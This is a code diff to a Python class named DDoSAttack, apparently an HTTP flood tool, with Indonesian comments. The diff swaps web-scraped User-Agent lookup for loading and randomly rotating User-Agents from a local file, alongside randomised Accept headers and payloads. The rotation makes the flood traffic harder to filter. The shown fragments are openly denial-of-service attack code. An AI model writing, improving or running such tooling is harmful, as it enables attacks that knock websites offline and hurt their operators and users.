@@ -6,7 +6,6 @@ import logging
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from requests_html import HTMLSession
 
 class DDoSAttack:
     def __init__(self, url, threads, duration):
@@ -48,11 +47,17 @@ class DDoSAttack:
         session.mount("https://", adapter)
         return session
 
-    def get_user_agent(self):
-        """Mengambil User-Agent yang valid"""
-        session = HTMLSession()
-        r = session.get('https://developers.whatismybrowser.com/useragents/explore/')
-        return r.html.find('td.useragent', first=True).text
+    def load_user_agents(self, file_path="user-agent.txt"):
+        """Memuat User-Agent dari file teks"""
+        try:
+            with open(file_path, "r") as file:
+                user_agents = [line.strip() for line in file if line.strip()]
+                if not user_agents:
+                    raise ValueError("File User-Agent kosong.")
+                return user_agents
+        except FileNotFoundError:
+            self.logger.error("File user-agent.txt tidak ditemukan.")
+            return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"]
 
     def generate_payload(self):
         payloads = [
@@ -68,8 +73,9 @@ class DDoSAttack:
         return random.choice(payloads)
 
     def generate_headers(self):
+        user_agents = self.load_user_agents()
         return {
-            "User-Agent": self.get_user_agent(),
+            "User-Agent": random.choice(user_agents),
             "Accept": random.choice([
                 "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                 "application/json,text/plain,*/*",
